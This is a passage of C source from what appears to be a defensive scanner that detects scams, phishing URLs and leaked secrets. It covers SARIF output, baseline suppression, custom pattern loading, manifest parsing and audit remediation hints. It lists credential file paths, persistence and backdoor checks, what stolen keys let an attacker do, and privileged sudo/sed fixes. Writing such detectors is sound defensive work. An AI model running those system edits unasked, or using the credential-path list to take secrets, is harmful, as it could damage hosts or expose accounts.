          "Technical mention of encryption — borderline" },
    };
    int n = sizeof(cases) / sizeof(cases[0]);

    printf("\n=== Text scam detection self-test ===\n");
    for (i = 0; i < n; i++) {
        TextVerdict v = hlse_check_text(cases[i].input);
        int ok = (v.score >= cases[i].min_score
                  && v.score <= cases[i].max_score);
        printf("%s [%3d in %d..%d]  %s\n",
               ok ? "PASS" : "FAIL",
               v.score, cases[i].min_score, cases[i].max_score,
               cases[i].desc);
        if (!ok) {
            int j;
            printf("       text: %.80s\n", cases[i].input);
            for (j = 0; j < v.n_reasons; j++) {
                printf("       reason: %s\n", v.reasons[j]);
            }
            fail++;
        } else {
            pass++;
        }
    }
    printf("Text tests: %d passed, %d failed\n", pass, fail);
    return fail == 0 ? 0 : 1;
}

/* ─────────────────────────── JSON output ────────────────────────────── */


/* ── SARIF 2.1.0 output (GitHub code-scanning compatible) ─────────────────
 *
 * The scan subcommand streams findings as it walks the tree. SARIF needs a
 * single JSON document, so when --sarif is set we accumulate findings into
 * this fixed-capacity buffer and emit them all at the end. The cap is
 * generous; overflow simply truncates the report (a logged note is added).
 *
 * Each finding: file path, 1-based line, rule id, message, score.        */
#define SARIF_MAX_FINDINGS 4096

typedef struct {
    char  path[1024];
    int   line;
    char  rule[32];      /* e.g. "secret", "phishing-url", "file-masquerade" */
    char  pattern_id[40];/* stable HLSE-* token for SOAR routing (P91)        */
    char  message[512];
    int   score;
} SarifFinding;

static SarifFinding g_sarif[SARIF_MAX_FINDINGS];
static int          g_sarif_n = 0;
static int          g_sarif_overflow = 0;

static void
sarif_add(const char *path, int line, const char *rule,
          const char *pattern_id, const char *message, int score) {
    SarifFinding *f;
    if (g_sarif_n >= SARIF_MAX_FINDINGS) { g_sarif_overflow = 1; return; }
    f = &g_sarif[g_sarif_n++];
    snprintf(f->path, sizeof(f->path), "%s", path);
    f->line = line < 1 ? 1 : line;
    snprintf(f->rule, sizeof(f->rule), "%s", rule);
    snprintf(f->pattern_id, sizeof(f->pattern_id), "%s",
             pattern_id ? pattern_id : "");
    snprintf(f->message, sizeof(f->message), "%s", message);
    f->score = score;
}

/* Map HLSE 0-100 score to SARIF level + security-severity (0.0-10.0). */
static const char *
sarif_level(int score) {
    if (score >= 60) return "error";
    if (score >= 40) return "warning";
    return "note";
}

static void
sarif_emit(const char *tool_version) {
    int i;
    /* Rule metadata — id, display name, short description, and
     * security-severity (CVSS-like 0–10 for GitHub code scanning).    */
    static const struct {
        const char *id;
        const char *name;
        const char *description;
        const char *severity; /* string to avoid float formatting issues */
        const char *tags;     /* JSON array body for properties.tags        */
    } RULES[] = {
        { "secret",         "Credential Leak",
          "Exposed API key, token, or private key found in source file.",
          "9.0",
          "\"security\", \"external/cwe/cwe-798\"" },
        { "phishing-url",   "Phishing URL",
          "URL exhibits homoglyph, typosquat, or subdomain-spoof phishing indicators.",
          "7.5",
          "\"security\", \"external/cwe/cwe-1021\"" },
        { "file-masquerade","File Masquerade",
          "File extension or magic bytes indicate the file is disguised malware.",
          "8.0",
          "\"security\", \"external/cwe/cwe-646\"" },
        { "package-typosquat","Dependency Typosquat",
          "Declared dependency name is a likely typosquat of a popular package "
          "(dependency-confusion / supply-chain attack).",
          "7.0",
          "\"security\", \"external/cwe/cwe-1357\"" },
        { NULL, NULL, NULL, NULL, NULL }
    };
    char esc[1280];

    printf("{\n");
    printf("  \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n");
    printf("  \"version\": \"2.1.0\",\n");
    printf("  \"runs\": [\n    {\n");
    printf("      \"tool\": {\n        \"driver\": {\n");
    printf("          \"name\": \"HLSE\",\n");
    printf("          \"informationUri\": \"https://github.com/shizukutanaka/hlse\",\n");
    printf("          \"version\": \"%s\",\n", tool_version);
    printf("          \"rules\": [\n");
    for (i = 0; RULES[i].id; i++) {
        printf("            {\n"
               "              \"id\": \"%s\", \"name\": \"%s\",\n"
               "              \"shortDescription\": { \"text\": \"%s\" },\n"
               "              \"helpUri\": \"https://github.com/shizukutanaka/hlse/blob/main/docs/SIEM_INTEGRATION.md\",\n"
               "              \"properties\": { \"security-severity\": \"%s\", \"tags\": [%s] }\n"
               "            }%s\n",
               RULES[i].id, RULES[i].name, RULES[i].description,
               RULES[i].severity, RULES[i].tags, RULES[i+1].id ? "," : "");
    }
    printf("          ]\n        }\n      },\n");
    printf("      \"results\": [\n");
    for (i = 0; i < g_sarif_n; i++) {
        SarifFinding *f = &g_sarif[i];
        double sev = (double)f->score / 10.0;
        printf("        {\n");
        printf("          \"ruleId\": \"%s\",\n", f->rule);
        printf("          \"level\": \"%s\",\n", sarif_level(f->score));
        hlse_json_escape(f->message, esc, sizeof(esc));
        printf("          \"message\": { \"text\": \"%s\" },\n", esc);
        if (f->pattern_id[0]) {
            char epid[64];
            hlse_json_escape(f->pattern_id, epid, sizeof(epid));
            printf("          \"properties\": { \"security-severity\": \"%.1f\","
                   " \"hlse-score\": %d, \"pattern_id\": \"%s\" },\n",
                   sev, f->score, epid);
        } else {
            printf("          \"properties\": { \"security-severity\": \"%.1f\","
                   " \"hlse-score\": %d },\n", sev, f->score);
        }
        printf("          \"locations\": [\n            {\n");
        printf("              \"physicalLocation\": {\n");
        hlse_json_escape(f->path, esc, sizeof(esc));
        printf("                \"artifactLocation\": { \"uri\": \"%s\" },\n", esc);
        printf("                \"region\": { \"startLine\": %d }\n", f->line);
        printf("              }\n            }\n          ]\n");
        printf("        }%s\n", (i + 1 < g_sarif_n) ? "," : "");
    }
    printf("      ]\n");
    if (g_sarif_overflow) {
        printf("      ,\"properties\": { \"truncated\": true }\n");
    }
    printf("    }\n  ]\n}\n");
}

/* Delivery channel supplied via --from.  NULL when the flag is absent.
 * Socratic Q: "You analysed the URL — but HLSE has no idea how it reached
 * you.  A QR code in a parking meter and a link you typed yourself share
 * the same bytes, yet carry very different priors.  Should the channel
 * change the verdict?"  Answer: yes — the channel is a threat-prior.      */
static const char *g_from_channel = NULL;

/* Score boost applied to URLs when a high-risk delivery channel is set.
 * Only meaningful for URLs (not text); capped at 100 at output sites.    */
static int
channel_delta(const char *ch)
{
    if (!ch) return 0;
    if (strcmp(ch, "qr")     == 0) return 20; /* quishing — QR masks destination */
    if (strcmp(ch, "sms")    == 0) return 15; /* smishing — primary mobile vector  */
    if (strcmp(ch, "email")  == 0) return 10; /* phishing — classic email vector   */
    if (strcmp(ch, "dm")     == 0) return 10; /* social-engineering via DM         */
    if (strcmp(ch, "manual") == 0) return  0; /* user typed it — lowest prior      */
    return 0;
}

/* Human-readable reason string for the channel boost (NULL when delta==0). */
static const char *
channel_reason(const char *ch)
{
    if (!ch) return NULL;
    if (strcmp(ch, "qr")    == 0)
        return "Channel (qr): +20 \xe2\x80\x94 QR codes mask destinations (quishing)";
    if (strcmp(ch, "sms")   == 0)
        return "Channel (sms): +15 \xe2\x80\x94 SMS is the primary smishing "
               "vector; on RCS the displayed sender name is set by the sender, "
               "so a familiar brand or carrier label is NOT proof of identity";
    if (strcmp(ch, "email") == 0)
        return "Channel (email): +10 \xe2\x80\x94 email is the primary phishing vector";
    if (strcmp(ch, "dm")    == 0)
        return "Channel (dm): +10 \xe2\x80\x94 direct messages are used for social-engineering";
    return NULL; /* manual → no delta, no noise */
}

/* ── Baseline / allowlist (Perspective 107, roadmap P0-1) ──────────────────
 * Commercial secret scanners (detect-secrets, gitleaks) need a way to accept
 * known findings so a brownfield repo's first scan does not fail the CI gate
 * forever. HLSE implements this as a pure post-detection output filter — no
 * detection logic touched, F1 unchanged:
 *   1. `hlse_core --fingerprints scan .` emits one stable fingerprint per
 *      finding; redirect to a file to create a baseline.
 *   2. `hlse_core --baseline <file> scan .` suppresses every finding whose
 *      fingerprint is listed; only NEW findings count toward the gate.
 *   3. an inline `hlse:allow` token on a scanned line suppresses findings on
 *      that line (gitleaks:allow-style).
 * The fingerprint is a 64-bit FNV-1a hash of relpath\0pattern_id\0match,
 * rendered as 16 hex chars. It deliberately OMITS the line number so a
 * finding that moves lines stays suppressed. */
static const char *g_baseline_file = NULL;   /* --baseline <file> */
static int         g_emit_fingerprints = 0;  /* --fingerprints */
static char      **g_baseline_fps = NULL;    /* loaded fingerprint set */
static size_t      g_baseline_n = 0;
static int         g_git_history = 0;        /* --git-history (P0-2) */

/* Write a stable 16-hex-char fingerprint of (relpath, pattern_id, match) into
 * out[17]. NUL-separated so distinct field boundaries can't alias. */
static void
hlse_fingerprint(const char *relpath, const char *pattern_id,
                 const char *match, char out[17]) {
    unsigned long long h = 1469598103934665603ULL; /* FNV-1a 64 offset basis */
    const char *parts[3];
    int p;
    parts[0] = relpath ? relpath : "";
    parts[1] = pattern_id ? pattern_id : "";
    parts[2] = match ? match : "";
    for (p = 0; p < 3; p++) {
        const unsigned char *s = (const unsigned char *)parts[p];
        while (*s) { h ^= (unsigned long long)*s++; h *= 1099511628211ULL; }
        h *= 1099511628211ULL; /* absorb the NUL field separator */
    }
    snprintf(out, 17, "%016llx", h);
}

/* Return 1 if fp is in the loaded baseline set (linear scan; baselines are
 * modest and this runs once per finding). */
static int
hlse_baseline_has(const char *fp) {
    size_t i;
    for (i = 0; i < g_baseline_n; i++)
        if (strcmp(g_baseline_fps[i], fp) == 0) return 1;
    return 0;
}

/* Load fingerprints from the baseline file (one per line; '#' comments and
 * blank lines ignored; surrounding whitespace trimmed). Returns 0 on success,
 * -1 if the file cannot be opened. */
static int
hlse_baseline_load(const char *path) {
    FILE *fp = fopen(path, "r");
    char line[128];
    if (!fp) return -1;
    while (fgets(line, sizeof(line), fp)) {
        char *s = line, *t;
        size_t n;
        while (*s == ' ' || *s == '\t') s++;
        if (*s == '#' || *s == '\n' || *s == '\r' || *s == '\0') continue;
        /* Keep only the first whitespace-delimited token: the --fingerprints
         * output is "<fp>  <pattern_id>  <relpath>" for human readability, but
         * the lookup key is just the 16-hex fingerprint. Truncate at the first
         * space/tab so the readable columns are ignored on load. */
        for (t = s; *t && *t != ' ' && *t != '\t' && *t != '\n' && *t != '\r'; t++)
            ;
        *t = '\0';
        n = strlen(s);
        if (n == 0) continue;
        {
            char **grown = realloc(g_baseline_fps,
                                   (g_baseline_n + 1) * sizeof(char *));
            char *dup;
            if (!grown) break;
            g_baseline_fps = grown;
            dup = malloc(n + 1);
            if (!dup) break;
            memcpy(dup, s, n + 1);
            g_baseline_fps[g_baseline_n++] = dup;
        }
    }
    fclose(fp);
    return 0;
}

/* Free every fingerprint string owned by the loaded baseline set and the
 * backing array itself, then reset g_baseline_n/g_baseline_fps to their
 * pre-load state so a subsequent hlse_baseline_load() call starts clean.
 * Safe when no baseline was ever loaded, and idempotent. Named to match the
 * hlse_clear_custom_secret_patterns()/hlse_clear_custom_brands() convention. */
static void
hlse_baseline_clear(void) {
    size_t i;
    for (i = 0; i < g_baseline_n; i++)
        free(g_baseline_fps[i]);
    free(g_baseline_fps);
    g_baseline_fps = NULL;
    g_baseline_n = 0;
}

/* Return 1 if a scanned line carries an inline `hlse:allow` suppression. */
static int
hlse_line_allowed(const char *line) {
    return line && strstr(line, "hlse:allow") != NULL;
}

/* ── Custom pattern config file (Perspective 110/112, roadmap P0-3/P1-6) ───
 * The built-in credential patterns and brand list are compiled in and
 * cannot name an organization's internal token formats or protect its own
 * name/executives without a rebuild — a real commercial-adoption blocker.
 * `--patterns <file>` loads a small, non-regex config format and registers
 * each entry via hlse_register_custom_secret_pattern() /
 * hlse_register_custom_brand() (hlse_secrets.c), which hlse_scan_secrets()
 * and hlse_check_email_headers() then check using the exact same logic as
 * their built-in tables. Purely additive — the benchmark corpus never
 * passes --patterns, so F1 is unaffected.
 *
 * File format (one directive per line; '#' comments and blank lines ignored):
 *   SECRET <prefix> <min_suffix> <charset> <score> <label...>
 *   BRAND  <name> <owned_domain1>[,<owned_domain2>...]
 * charset is one of: alnum | alnum_dash | hex | alpha | digit
 * SECRET's label is free text (may contain spaces) to end of line.
 * BRAND's owned-domains list has no spaces (comma-separated, up to 4).
 *
 * Example:
 *   # ACME Corp internal API keys and impersonation targets
 *   SECRET ACME_KEY_ 20 alnum 85 ACME Internal API Key
 *   BRAND acmecorp acmecorp.com,acme-corp.com
 */
static int
patterns_charset_from_name(const char *name, HlseCharset *out) {
    if (strcmp(name, "alnum")      == 0) { *out = HLSE_CHARSET_ALNUM;      return 1; }
    if (strcmp(name, "alnum_dash") == 0) { *out = HLSE_CHARSET_ALNUM_DASH; return 1; }
    if (strcmp(name, "hex")        == 0) { *out = HLSE_CHARSET_HEX;        return 1; }
    if (strcmp(name, "alpha")      == 0) { *out = HLSE_CHARSET_ALPHA;      return 1; }
    if (strcmp(name, "digit")      == 0) { *out = HLSE_CHARSET_DIGIT;      return 1; }
    return 0;
}

static int
patterns_load_secret_line(const char *path, int lineno, const char *rest) {
    char prefix[32], charset_name[16], label[256];
    int min_suffix = 0, score = 0, consumed = 0;
    HlseCharset cs;
    if (sscanf(rest, "%31s %d %15s %d %n", prefix, &min_suffix,
               charset_name, &score, &consumed) != 4) {
        fprintf(stderr, "hlse: warning: %s:%d: malformed SECRET line, "
                "skipped\n", path, lineno);
        return 0;
    }
    if (!patterns_charset_from_name(charset_name, &cs)) {
        fprintf(stderr, "hlse: warning: %s:%d: unknown charset '%s' "
                "(expected alnum|alnum_dash|hex|alpha|digit), skipped\n",
                path, lineno, charset_name);
        return 0;
    }
    {
        const char *lp = rest + consumed;
        size_t n;
        while (*lp == ' ' || *lp == '\t') lp++;
        snprintf(label, sizeof(label), "%s", lp);
        n = strlen(label);
        while (n > 0 && (label[n-1] == '\n' || label[n-1] == '\r'))
            label[--n] = '\0';
        if (n == 0) {
            fprintf(stderr, "hlse: warning: %s:%d: missing label, skipped\n",
                    path, lineno);
            return 0;
        }
    }
    if (!hlse_register_custom_secret_pattern(prefix, min_suffix, cs,
                                              label, score)) {
        fprintf(stderr, "hlse: warning: %s:%d: pattern rejected (bad field "
                "or registry full), skipped\n", path, lineno);
        return 0;
    }
    return 1;
}

/* Parse a BRAND line's remainder as "<name> <domains>", where <domains> is
 * the LAST whitespace-delimited token (comma-separated, no internal
 * spaces by construction) and <name> is everything before it. Splitting
 * from the end (not sscanf's %s, which stops at the first space) lets
 * <name> itself contain spaces — real organization names commonly do
 * ("Acme Corp", not "AcmeCorp"), matching how the built-in brand table
 * already handles multi-word entries like "office 365" / "human resources"
 * via contains_word()'s literal substring match. */
static int
patterns_load_brand_line(const char *path, int lineno, const char *rest) {
    char name[64], domains[512];
    char buf[600];
    size_t len;
    const char *end, *split, *name_end, *name_start;
    size_t domlen, namelen;

    snprintf(buf, sizeof(buf), "%s", rest);
    len = strlen(buf);
    while (len > 0 && (buf[len-1] == '\n' || buf[len-1] == '\r' ||
                       buf[len-1] == ' '  || buf[len-1] == '\t'))
        buf[--len] = '\0';
    end = buf + len;

    split = end;
    while (split > buf && split[-1] != ' ' && split[-1] != '\t') split--;
    if (split == buf || split == end) {
        fprintf(stderr, "hlse: warning: %s:%d: malformed BRAND line "
                "(expected: BRAND <name> <domain1>[,<domain2>...]), "
                "skipped\n", path, lineno);
        return 0;
    }
    domlen = (size_t)(end - split);
    if (domlen >= sizeof(domains)) domlen = sizeof(domains) - 1;
    memcpy(domains, split, domlen);
    domains[domlen] = '\0';

    name_end = split;
    while (name_end > buf && (name_end[-1] == ' ' || name_end[-1] == '\t'))
        name_end--;
    name_start = buf;
    while (name_start < name_end && (*name_start == ' ' || *name_start == '\t'))
        name_start++;
    namelen = (size_t)(name_end - name_start);
    if (namelen == 0 || namelen >= sizeof(name)) {
        fprintf(stderr, "hlse: warning: %s:%d: malformed BRAND line "
                "(expected: BRAND <name> <domain1>[,<domain2>...]), "
                "skipped\n", path, lineno);
        return 0;
    }
    memcpy(name, name_start, namelen);
    name[namelen] = '\0';

    if (!hlse_register_custom_brand(name, domains)) {
        fprintf(stderr, "hlse: warning: %s:%d: brand rejected (bad field "
                "or registry full), skipped\n", path, lineno);
        return 0;
    }
    return 1;
}

/* Load and register custom patterns/brands from `path`. Returns 0 on
 * success (even if individual malformed lines were skipped with a warning),
 * -1 if the file cannot be opened. */
static int
hlse_patterns_load(const char *path) {
    FILE *fp = fopen(path, "r");
    char line[512];
    int lineno = 0, loaded = 0;
    if (!fp) return -1;
    while (fgets(line, sizeof(line), fp)) {
        char *s = line;
        char directive[16];
        int consumed = 0;
        lineno++;
        while (*s == ' ' || *s == '\t') s++;
        if (*s == '#' || *s == '\n' || *s == '\r' || *s == '\0') continue;
        if (sscanf(s, "%15s %n", directive, &consumed) != 1) {
            fprintf(stderr, "hlse: warning: %s:%d: malformed line, skipped\n",
                    path, lineno);
            continue;
        }
        if (strcmp(directive, "SECRET") == 0) {
            loaded += patterns_load_secret_line(path, lineno, s + consumed);
        } else if (strcmp(directive, "BRAND") == 0) {
            loaded += patterns_load_brand_line(path, lineno, s + consumed);
        } else {
            fprintf(stderr, "hlse: warning: %s:%d: unknown directive '%s' "
                    "(expected SECRET or BRAND), skipped\n",
                    path, lineno, directive);
        }
    }
    fclose(fp);
    if (loaded == 0) {
        fprintf(stderr, "hlse: warning: %s: no valid SECRET/BRAND entries "
                "loaded\n", path);
    }
    return 0;
}

/* Central suppression check for a scan finding, shared by all three checks
 * (file/secret/url). Computes the fingerprint; if --fingerprints is set,
 * prints it and returns 2 (caller skips all counting AND emission). Returns 1
 * to suppress (baseline hit or inline allow), 0 to emit normally. `line` may
 * be NULL for whole-file findings that have no inline-allow context. */
static int
hlse_scan_suppress(const char *relpath, const char *pattern_id,
                   const char *match, const char *line) {
    char fp[17];
    hlse_fingerprint(relpath, pattern_id, match, fp);
    if (g_emit_fingerprints) {
        printf("%s  %s  %s\n", fp, pattern_id ? pattern_id : "-",
               relpath ? relpath : "-");
        return 2;
    }
    if (hlse_baseline_has(fp)) return 1;
    if (hlse_line_allowed(line)) return 1;
    return 0;
}

/* ── Manifest scanning (Perspective 108, roadmap P1-8) ─────────────────────
 * The single-name `package <name>` check is impractical for real dependency
 * files. `package --manifest <file>` parses a manifest and runs the existing
 * hlse_check_package() over every declared dependency. Ecosystem is inferred
 * from the filename or given explicitly. Pure orchestration of the existing
 * detector — no scoring change, F1 unchanged. */

/* Infer package ecosystem from a manifest filename (basename match). Returns
 * a canonical eco string or NULL if unrecognised. */
static const char *
manifest_ecosystem(const char *path) {
    const char *b = strrchr(path, '/');
    b = b ? b + 1 : path;
    if (strncmp(b, "requirements", 12) == 0 || strcmp(b, "Pipfile") == 0)
        return "pip";
    if (strcmp(b, "package.json") == 0 ||
        strcmp(b, "package-lock.json") == 0) return "npm";
    if (strcmp(b, "Cargo.toml") == 0 || strcmp(b, "Cargo.lock") == 0)
        return "cargo";
    if (strcmp(b, "go.mod") == 0) return "go";
    if (strcmp(b, "Gemfile") == 0 || strcmp(b, "Gemfile.lock") == 0)
        return "gem";
    return NULL;
}

/* Extract the leading pip/requirements-style package name from a line into
 * out (name = leading run of [A-Za-z0-9._-], stopping at a version operator
 * or extras bracket). Returns 1 if a name was found, else 0. Skips blank
 * lines, comments, and pip options (-r/-e/--). */
static int
manifest_name_pip(const char *line, char *out, size_t outcap) {
    const char *s = line;
    size_t n = 0;
    while (*s == ' ' || *s == '\t') s++;
    if (*s == '\0' || *s == '\n' || *s == '#' || *s == '-') return 0;
    while (*s && n + 1 < outcap &&
           ((*s >= 'A' && *s <= 'Z') || (*s >= 'a' && *s <= 'z') ||
            (*s >= '0' && *s <= '9') || *s == '.' || *s == '_' || *s == '-'))
        out[n++] = *s++;
    out[n] = '\0';
    return n > 0;
}

/* Extract the next npm dependency name at/after *cursor, tracking whether we
 * are inside a *dependencies object via *in_deps. Handles both the canonical
 * one-dep-per-line layout and the compact single-line object form, and can be
 * called repeatedly on the same line: it advances *cursor past what it
 * consumed. A dependency entry is  "name" : "version"  inside a dependencies
 * object. Returns 1 and fills out when a name is extracted, 0 when the current
 * text is exhausted. */
static int
manifest_name_npm(const char **cursor, int *in_deps, char *out, size_t outcap) {
    const char *p = *cursor;
    for (;;) {
        if (!*in_deps) {
            /* Look for a dependencies-section keyword on this text. */
            const char *k = NULL, *cands[4]; int ci, best = -1;
            cands[0] = strstr(p, "\"dependencies\"");
            cands[1] = strstr(p, "\"devDependencies\"");
            cands[2] = strstr(p, "\"peerDependencies\"");
            cands[3] = strstr(p, "\"optionalDependencies\"");
            for (ci = 0; ci < 4; ci++)
                if (cands[ci] && (best < 0 || cands[ci] < cands[best])) best = ci;
            if (best < 0) { *cursor = p + strlen(p); return 0; }
            k = strchr(cands[best], '{');
            if (!k) { *cursor = p + strlen(p); return 0; }
            *in_deps = 1;
            p = k + 1;
            continue;
        }
        /* In a deps object: the next '}' closes it; the next '"' before it
         * starts a "name": "ver" entry. */
        {
            const char *close = strchr(p, '}');
            const char *q = strchr(p, '"');
            size_t n = 0;
            const char *r;
            if (!q || (close && close < q)) {
                if (close) { *in_deps = 0; p = close + 1; continue; }
                *cursor = p + strlen(p); return 0;
            }
            r = q + 1;
            while (*r && *r != '"' && n + 1 < outcap) out[n++] = *r++;
            out[n] = '\0';
            if (*r != '"') { *cursor = p + strlen(p); return 0; }
            r++;                                  /* past closing quote */
            while (*r == ' ' || *r == '\t') r++;
            if (*r != ':') { p = r; continue; }   /* not a key — keep scanning */
            *cursor = r + 1;
            if (n > 0) return 1;
        }
    }
}

/* Per-finding remediation hint for HIGH/CRIT audit findings.
 * Returns a short command or action string, or NULL if no specific fix
 * is available for this finding. Keyed to the A-code prefix + keywords. */
static const char *
audit_remediation_for(const char *desc)
{
    if (!desc) return NULL;
    /* A1: SSH configuration */
    if (strncmp(desc, "A1:", 3) == 0) {
        if (strstr(desc, "PermitRootLogin yes"))
            return "sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/'"
                   " /etc/ssh/sshd_config && sudo systemctl reload ssh";
        if (strstr(desc, "PasswordAuthentication yes"))
            return "sudo sed -i 's/PasswordAuthentication yes/"
                   "PasswordAuthentication no/'"
                   " /etc/ssh/sshd_config && sudo systemctl reload ssh";
        if (strstr(desc, "Protocol 1"))
            return "sudo sed -i 's/^Protocol 1/Protocol 2/'"
                   " /etc/ssh/sshd_config && sudo systemctl reload ssh";
        if (strstr(desc, "PermitEmptyPasswords"))
            return "sudo sed -i 's/PermitEmptyPasswords yes/"
                   "PermitEmptyPasswords no/'"
                   " /etc/ssh/sshd_config && sudo systemctl reload ssh";
        if (strstr(desc, "authorized_keys"))
            return "chmod 600 ~/.ssh/authorized_keys";
        return "sudo nano /etc/ssh/sshd_config  # correct the flagged setting,"
               " then: sudo systemctl reload ssh";
    }
    /* A2: File permission issues */
    if (strncmp(desc, "A2:", 3) == 0) {
        if (strstr(desc, "id_rsa") || strstr(desc, "id_ed25519")
            || strstr(desc, "id_ecdsa"))
            return "chmod 600 ~/.ssh/id_rsa  # (or id_ed25519 / id_ecdsa)";
        if (strstr(desc, ".aws/credentials"))
            return "chmod 600 ~/.aws/credentials";
        if (strstr(desc, ".env"))
            return "chmod 600 ~/.env";
        if (strstr(desc, ".netrc"))
            return "chmod 600 ~/.netrc";
        if (strstr(desc, ".pgpass"))
            return "chmod 600 ~/.pgpass";
        if (strstr(desc, ".docker/config.json"))
            return "chmod 600 ~/.docker/config.json";
        if (strstr(desc, ".kube/config"))
            return "chmod 600 ~/.kube/config";
        if (strstr(desc, "gnupg") || strstr(desc, "GPG"))
            return "chmod 700 ~/.gnupg && chmod 600 ~/.gnupg/secring.gpg";
        return "chmod go-rwx <file>  # remove group/other read permission"
               " from the flagged file";
    }
    /* A3: DNS / hosts file poisoning */
    if (strncmp(desc, "A3:", 3) == 0) {
        if (strstr(desc, "/etc/hosts"))
            return "sudo diff /etc/hosts /etc/hosts.bak 2>/dev/null ||"
                   " sudo cp /etc/hosts /etc/hosts.bak;"
                   " review /etc/hosts for unexpected entries";
        return "review the flagged DNS resolver or hosts file entry";
    }
    /* A4: Cron persistence */
    if (strncmp(desc, "A4:", 3) == 0)
        return "crontab -l  # review; then: crontab -e to remove"
               " the suspicious entry";
    /* A5: Insecure PATH */
    if (strncmp(desc, "A5:", 3) == 0)
        return "remove '.' and any world-writable directories from PATH"
               " in ~/.bashrc or ~/.profile; then: source ~/.bashrc";
    /* A6: Shell startup backdoor */
    if (strncmp(desc, "A6:", 3) == 0)
        return "nano ~/.bashrc  # (or ~/.profile / ~/.bash_profile)"
               " — remove the flagged line, then: source ~/.bashrc";
    /* A7: Sudoers NOPASSWD */
    if (strncmp(desc, "A7:", 3) == 0)
        return "sudo visudo  # change 'NOPASSWD: ALL' to 'ALL'"
               " to require a password for sudo";
    /* A8: Systemd user unit persistence */
    if (strncmp(desc, "A8:", 3) == 0)
        return "systemctl --user disable <unit> &&"
               " systemctl --user stop <unit>;"
               " then: rm ~/.config/systemd/user/<unit>.service";
    return NULL;
}

/* Map a credential type label to what access it grants the attacker.
 *
 * Socratic question (Perspective 99): "'Stripe Live Publishable' matches the
 * strstr(type, \"Stripe\") branch below and is told it grants 'ability to
 * issue charges, view customer payment data, and issue refunds' — but a
 * publishable key (pk_live_) cannot do any of that by Stripe's own design;
 * only a SECRET key (sk_live_/rk_live_) can. Reachable whenever this finding
 * combines with another to cross the >=60 objective/remediation/triage
 * threshold (e.g. alongside a JWT), telling the user their exposed
 * publishable key just handed an attacker refund access — false, and exactly
 * the kind of over-claim that erodes trust in every other correct verdict."
 *
 * Exact-match this label BEFORE the generic Stripe substring check so a
 * publishable key gets the accurate (and much calmer) objective instead of
 * inheriting the secret-key narrative.                                     */
static const char *
secret_objective_for(const char *type)
{
    if (!type || !type[0]) return NULL;
    if (strcmp(type, "Stripe Live Publishable") == 0)
        return "none directly \xe2\x80\x94 publishable keys are designed to be "
               "embedded in public client-side code and cannot create charges, "
               "issue refunds, or read customer payment data; only a paired "
               "SECRET key (sk_live_/rk_live_) grants that access";
    if (strstr(type, "AWS"))
        return "cloud API access \xe2\x80\x94 S3 read/write, EC2 control, and IAM "
               "privilege escalation; all resources visible to this key are at risk";
    if (strstr(type, "GitHub") || strstr(type, "GitLab"))
        return "source code and CI/CD pipeline access \xe2\x80\x94 read/write "
               "repositories, access CI secrets, trigger workflows";
    if (strstr(type, "Stripe"))
        return "payment processing \xe2\x80\x94 ability to issue charges, view "
               "customer payment data, and issue refunds";
    if (strstr(type, "Google") || strstr(type, "GCP"))
        return "Google Cloud API access \xe2\x80\x94 Maps, Analytics, or Cloud "
               "resources depending on key scope";
    if (strstr(type, "Slack"))
        return "workspace access \xe2\x80\x94 read messages and files across "
               "channels, post as the bot user or the token owner";
    if (strstr(type, "SSH") || strstr(type, "Private Key")
        || strstr(type, "RSA") || strstr(type, "OPENSSH"))
        return "server authentication \xe2\x80\x94 SSH access to every host that "
               "trusts this key (check authorized_keys)";
    if (strstr(type, "Database") || strstr(type, "Postgres")
        || strstr(type, "MySQL") || strstr(type, "Mongo"))
        return "database read/write access \xe2\x80\x94 plaintext query access "
               "to all records in the connected database";
    if (strstr(type, "Twilio") || strstr(type, "SendGrid")
        || strstr(type, "Mailgun"))
        return "messaging API access \xe2\x80\x94 send SMS/email as your account, "
               "read inbound messages, and incur billing charges";
    return "authenticated access to the associated service and any resource "
           "this credential controls";
}

/* Perspective 99: a factual correction for credential TYPES that are
 * public-by-design and therefore not "compromised" in the sense the rest of
 * the secret advisory assumes. Unlike hlse_exoneration_for() (a probabilistic
 * "might be a false positive" hedge for a score band), this is an
 * unconditional, type-specific fact: Stripe publishable keys are ALWAYS
 * meant to be public, at any score. Returns NULL for every other type. */
static const char *
secret_finding_caveat(const char *type) {
    if (!type) return NULL;
    if (strcmp(type, "Stripe Live Publishable") == 0)
        return "Stripe publishable keys (pk_live_/pk_test_) are designed to "
               "be public \xe2\x80\x94 embedded in checkout pages, mobile "
               "apps, and browser JavaScript by every Stripe integration. "
               "Stripe's own documentation confirms they cannot create "
               "charges, issue refunds, or read customer payment data. "
               "Rotation is not required for this key; if a paired SECRET "
               "key (sk_live_/rk_live_) was also exposed, that one needs "
               "immediate rotation instead.";
    return NULL;
}

/* Socratic question (Perspective 102): "The P101 audit found the file kind's
 * pattern/objective/verify text duplicated four ways and consolidated it —
 * does 'secret' have the exact same problem?" Answer: yes. The pattern label
 * ("exposed credential — %s"), verify, triage, and cascade_risk text were
 * each independently copy-pasted at the standalone `secret` JSON site and
 * the scan-embedded JSON site (identical strings, two names: sec_vrf/ss_vrf,
 * sec_tri/ss_tri, sec_cas/ss_cas), and ALSO reduced to shorter, differently-
 * worded printf literals at the two plaintext sites — so a `secret` verdict
 * read as JSON and the same verdict read as plaintext described the
 * independent verification step differently. Consolidated into shared
 * accessors, mirroring file_masquerade_objective()/file_masquerade_verify();
 * every one of the four sites and both output formats now say the same
 * thing. Pure refactor — no detection logic, score, or field value changed. */
static void
secret_pattern_label(const char *ftype, char *buf, size_t buflen) {
    snprintf(buf, buflen, "exposed credential \xe2\x80\x94 %s", ftype);
}

static const char *
secret_verify_text(void) {
    /* Deliberately avoids the phrase "blast radius" — `scan` has a distinct,
     * unrelated BLAST RADIUS warning for credentials found across multiple
     * asset classes (P102 caught the two colliding in scan's plaintext
     * output once JSON/plaintext text was unified). */
    return "check access logs for this credential BEFORE revoking "
           "\xe2\x80\x94 audit trails (AWS CloudTrail, GitHub audit "
           "log) reveal whether it was already used and exactly what "
           "was accessed";
}

static const char *
secret_triage_text(void) {
    return "revoke or rotate the credential immediately (do not "
           "delete \xe2\x80\x94 rotate to cut off access before the key is "
           "gone); purge from git history with git filter-repo or "
           "BFG Repo Cleaner \xe2\x80\x94 assume every clone already has it";
}

static const char *
secret_cascade_text(void) {
    return "every other credential in the same file, repository, "
           "or environment \xe2\x80\x94 treat everything co-located as "
           "potentially leaked; also rotate any secret that shared "
           "the same passphrase or was stored alongside this one";
}

